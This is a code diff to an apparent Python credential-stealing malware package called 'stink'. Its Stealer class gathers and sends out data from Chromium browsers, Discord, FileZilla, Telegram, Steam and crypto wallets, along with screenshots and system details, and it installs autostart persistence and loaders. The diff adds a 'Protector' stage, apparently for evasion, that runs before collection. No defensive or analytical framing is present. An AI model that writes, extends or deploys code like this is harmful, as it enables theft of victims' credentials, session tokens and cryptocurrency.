@@ -1,13 +1,13 @@
 from sys import argv
 from time import sleep
-from typing import List
+from typing import List, Any
 from threading import Thread
 from multiprocessing import Pool
 
-from stink.enums import Features, Utils
-from stink.utils import Autostart, Message
+from stink.enums import Features, Utils, Protectors
 from stink.helpers import functions, MemoryStorage
 from stink.helpers.config import MultistealerConfig, Browsers
+from stink.utils import Autostart, Message, Protector, Loader
 from stink.modules import Chromium, Discord, FileZilla, Processes, Screenshot, System, Telegram, Steam, Wallets
 
 
@@ -16,7 +16,15 @@ class Stealer(Thread):
     Collects and sends the specified data.
     """
 
-    def __init__(self, senders: List = None, features: List = None, utils: List = None, loaders: List = None, delay: int = 0):
+    def __init__(
+        self,
+        senders: List[Any] = None,
+        features: List[Features] = None,
+        utils: List[Utils] = None,
+        loaders: List[Loader] = None,
+        protectors: List[Protectors] = None,
+        delay: int = 0
+    ):
         Thread.__init__(self, name="Stealer")
 
         if loaders is None:
@@ -32,6 +40,11 @@ class Stealer(Thread):
 
         if features is None:
             features = [Features.all]
+
+        if protectors is None:
+            self.__protectors = [Protectors.all]
+        else:
+            self.__protectors = protectors
 
         self.__senders = senders
         self.__autostart = True if Utils.autostart in utils else False
@@ -194,6 +207,8 @@ class Stealer(Thread):
         try:
 
             sleep(self.__delay)
+
+            Protector(self.__protectors).run()
 
             if self.__message is True:
                 Thread(target=Message().run).start()
